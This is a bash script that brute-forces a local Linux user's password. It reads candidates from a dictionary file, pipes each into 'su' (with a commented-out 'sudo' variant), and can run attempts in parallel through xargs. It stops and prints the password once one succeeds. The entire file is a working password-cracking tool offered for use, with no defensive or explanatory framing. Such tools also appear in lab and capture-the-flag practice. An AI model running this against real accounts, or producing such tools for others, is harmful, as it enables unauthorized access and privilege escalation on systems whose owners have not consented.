#!/bin/bash

# SPDX-License-Identifier: MIT
# Copyright (c) 2025 Cristian Alexander (Crisstianpd)


#Check arguments
if [ "$#" -lt 2 ]; then
    echo "Use: $0 <user_name> <dictionary.txt> [subprocceses_number]"
    exit 1
fi

user="$1"
dictionary="$2"
num_sp=${3:-1}

if [ ! -f "$dictionary" ]; then
    echo "[!][ERROR] The dictionary '$dictionary' cannot be found."
    exit 1
fi


#CTRL_C function
ctrl_c(){
    echo -e "[!] Clousing program..."
    kill 0;exit
}
trap ctrl_c SIGINT



test_passwords() {
    local pass="$1"
    echo " Pass: $pass"
    #if timeout 0.5 bash -c "echo '$pass' | sudo -S su -c 'id'" &>/dev/null; then
    if timeout 0.5 bash -c "echo '$pass' | su $user -c 'id'" &>/dev/null; then
            echo -e "\e[1;32m\n[^] Password: '$pass' for user '$user'.\e[0m"
            kill 0;exit 0
    fi
}



# Export for xargs
export -f test_passwords
export user

if [ "$num_sp" -gt 1 ]; then
    #Paralel Processes
    cat "$dictionary" | xargs -P "$num_sp" -I {} bash -c 'test_passwords "$@"' _ {}
else
    #normal
    while IFS= read -r password; do
        test_passwords "$password"
    done < "$dictionary"
fi


echo -e "\e[1;31m[!] The password cannot be found for user '$user' in the dictionary.\e[0m"
exit 1
